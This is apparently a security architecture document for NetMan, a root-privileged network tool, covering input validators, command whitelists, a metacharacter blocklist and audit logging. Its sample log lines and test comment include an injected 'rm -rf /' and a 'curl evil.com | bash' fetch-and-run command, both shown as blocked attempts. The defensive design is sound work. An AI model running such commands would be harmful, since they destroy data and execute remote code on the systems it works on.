# NetMan Security Architecture

⚠️ **NetMan runs as root.** This document describes the security measures in place.

## Overview

All user input and shell execution flows through a centralized `SecurityManager` singleton. No module should ever call `popen()`, `system()`, or execute shell commands directly.

```
┌─────────────┐     ┌─────────────┐     ┌──────────────────┐     ┌───────┐
│   UI Tab    │ ──▶ │  Net Layer  │ ──▶ │ SecurityManager  │ ──▶ │ Shell │
│ (user input)│     │ (validation)│     │ (whitelist+exec) │     │       │
└─────────────┘     └─────────────┘     └──────────────────┘     └───────┘
                                               │
                                               ▼
                                        ┌─────────────┐
                                        │  Audit Log  │
                                        └─────────────┘
```

## SecurityManager (`src/core/security_manager.cpp`)

### Input Validators

| Type | Validation Rules |
|------|------------------|
| `INTERFACE` | Alphanumeric + hyphen/underscore, max 15 chars, must start with letter |
| `MAC_ADDRESS` | Strict `AA:BB:CC:DD:EE:FF` format |
| `IP_ADDRESS` | IPv4, each octet 0-255 |
| `IP_CIDR` | IPv4 + /0-32 |
| `HOSTNAME` | Alphanumeric + hyphen/dot, max 253 chars |
| `SSID` | Printable ASCII, max 32 chars |
| `PASSWORD` | 8-63 chars, printable ASCII |
| `PATH` | No `..`, no null bytes, no shell metacharacters |
| `COUNTRY_CODE` | Whitelist of 30 valid codes |
| `PORT` | 1-65535 |
| `CHAIN` | iptables built-in chains or alphanumeric custom |
| `TABLE` | filter/nat/mangle/raw/security only |
| `PROTOCOL` | tcp/udp/icmp/all only |
| `CHANNEL` | Valid WiFi channels per band |
| `BAND` | "2.4" or "5" only |
| `SHELL_ARG` | Alphanumeric + hyphen/underscore/dot/space only |

### Command Whitelists

Only these command prefixes are allowed:

**Root Commands:**
```
ip link, ip addr, ip route, ip neigh
iw, iwconfig, iwlist, iwgetid
hostapd, wpa_supplicant, dnsmasq
iptables, iptables-save, iptables-restore
nmcli, systemctl restart wpa_supplicant/NetworkManager
pkill -f 'hostapd/dnsmasq/wpa_supplicant
arp-scan, cat /tmp/netman/, sleep
echo 0/1 > /proc/sys/net/ipv4/ip_forward
iw reg set
```

**User Commands (read-only):**
```
which, ls -, ip link/addr/route/neigh show
iw dev, iwconfig, iwlist, iwgetid
curl -s --connect-timeout, getent hosts
sleep, ping -c
```

### Shell Injection Protection

**Blocked metacharacters:** `;|&\`$(){}[]<>!\n\r\\`

Also blocks:
- `$(...)` command substitution
- `${...}` variable expansion

Commands with ANY of these characters are rejected before whitelist check.

### Execution Flow

```cpp
// In net layer (e.g., mac_spoofer.cpp):
std::string safe_iface = SEC.safe_interface(user_input);
if (safe_iface.empty()) return false;  // Blocked

std::string safe_mac = SEC.safe_mac(user_mac);
if (safe_mac.empty()) return false;  // Blocked

// Only validated inputs reach exec:
auto result = SEC.exec("ip link set " + safe_iface + " address " + safe_mac, true);
```

### Audit Logging

All security events are logged to `/tmp/netman/security.log`:

```
2026-03-22 09:30:15 [BLOCKED] validate_interface: eth0;rm -rf /
2026-03-22 09:30:16 [EXEC BLOCKED] curl evil.com | bash (not whitelisted)
2026-03-22 09:30:17 [ROOT] EXIT=0 ip link set wlan0 address AA:BB:CC:DD:EE:FF
```

Sensitive data (passwords, tokens) is automatically redacted.

## Rules for Contributors

1. **NEVER** call `popen()`, `system()`, or `exec*()` directly
2. **ALWAYS** validate inputs through `SEC.validate()` or `SEC.safe_*()` 
3. **ALWAYS** use `SEC.exec()` for shell commands
4. **NEVER** build commands with raw user input — validate first
5. **NEVER** add command prefixes to whitelists without security review
6. **NEVER** include `timeout` in whitelists (handled specially)

## Testing Security

```bash
# Attempt injection (should be blocked):
# In code: SEC.exec("ip link ; rm -rf /", true)
# Result: [EXEC BLOCKED] - semicolon detected

# Check audit log:
cat /tmp/netman/security.log | grep BLOCKED
```

## Known Limitations

- SSID and Password validators allow shell metacharacters because they go to config files, not shell. If these are ever used in shell commands, they MUST be validated with `SHELL_ARG` first.
- Command whitelist is prefix-based. New commands require explicit addition.
